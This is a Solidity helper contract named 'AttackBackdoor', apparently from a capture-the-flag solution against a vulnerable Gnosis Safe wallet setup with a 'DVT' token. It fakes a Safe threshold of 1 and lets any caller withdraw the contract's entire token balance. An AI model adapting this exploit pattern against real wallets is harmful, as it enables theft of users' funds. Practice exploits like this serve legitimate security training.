pragma solidity 0.8.17;

import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract AttackBackdoor {
    address owner;
    IERC20 public immutable token;

    constructor(address _owner, address _dvt) {
        owner = _owner;
        token = IERC20(_dvt);
    }

    function getThreshold() external returns (uint256) {
        return 1;
    }

    function withdraw() external {
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}
